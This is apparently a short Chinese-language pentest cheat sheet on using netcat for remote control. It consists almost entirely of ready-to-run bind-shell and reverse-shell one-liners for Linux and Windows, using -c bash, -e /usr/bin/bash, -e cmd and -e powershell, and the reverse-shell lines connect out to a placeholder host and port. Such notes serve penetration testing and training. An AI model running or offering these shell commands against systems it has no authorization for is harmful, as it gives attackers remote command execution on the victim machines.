远程控制工具。

## 1 正向连接

侦听端口，并在连接后开启终端

```shell
[root@centos7-6 ~]# nc -lnvp [port] -c bash
```

```shell
[root@centos7-6 ~]# nc -lnvp [port] -e /usr/bin/bash
```

```powershell
PS C:\Users\Administrator> C:\path\nc.exe -lvnp [port] -e cmd
```

```powershell
PS C:\Users\Administrator> C:\path\nc.exe -lvnp [port] -e powershell
```

连接目标端口

```shell
┌──(root㉿kali-23)-[~]
└─# nc -nv [ip] [port]
```

```shell
┌──(root㉿kali-23)-[~]
└─# nc [host] [port]
```

```powershell
PS C:\Users\Administrator> C:\path\nc.exe -nv [ip] [port]
```

```powershell
PS C:\Users\Administrator> C:\path\nc.exe [host] [port]
```

## 2 反向链接

侦听端口

```shell
┌──(root㉿kali)-[~]
└─# nc -lnvp [port]
```

```powershell
PS C:\Users\Administrator> C:\path\nc.exe -lvnp [port]
```

连接目标端口，并在连接后开启终端

```shell
[root@centos7-6 ~]# nc -nv [ip] [port] -c bash
```

```shell
[root@centos7-6 ~]# nc [host] [port] -e /usr/bin/bash
```

```powershell
PS C:\Users\Administrator> C:\path\nc.exe [host] [port] -e cmd
```

```powershell
PS C:\Users\Administrator> C:\path\nc.exe [host] [port] -e powershell
```

---

Refrences

- [Netcat](https://nc110.sourceforge.io/)
